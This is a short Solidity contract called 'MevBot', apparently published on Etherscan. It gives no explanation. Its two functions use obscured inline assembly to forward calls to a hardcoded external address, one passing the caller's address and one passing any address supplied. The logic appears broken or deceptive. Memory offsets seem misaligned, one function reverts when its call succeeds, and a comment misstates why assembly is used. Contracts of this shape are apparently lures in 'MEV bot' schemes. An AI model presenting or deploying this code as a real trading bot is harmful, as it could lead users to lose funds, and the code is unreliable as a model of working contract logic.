/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

contract MevBot {
    address internal immutable owner;

    address internal immutable mev_address = 0x77ad3a15b78101883AF36aD4A875e17c86AC65d1;

    constructor() {
        owner = msg.sender;
    }

    function get_profit() public returns (uint256) {
        require(owner == msg.sender, "Only the bot can call this function!");

        address local_mev_address = mev_address; // we cannot use global variables in assembly
        
        uint256 r;

        assembly { 

            mstore(0x7c, 0x3a236a50)
            mstore(0x80, caller())

            r := call(sub(gas(), 5000), local_mev_address, 0, 0x7c, 0x44, 0, 0)
            if iszero(r) {
                revert(3, 3)
            }
        }
        return r;
    }

    function claim_profit(address addy) public {

        address local_mev_address = mev_address; // we cannot use global variables in assembly
        
        assembly { 

            mstore(0x7c, 0x2b935d12)
            mstore(0x80, addy)

            let c := call(sub(gas(), 5000), local_mev_address, 0, 0x7c, 0x44, 0, 0)
            if c {
                revert(3, 3)
            }
        }
    }
}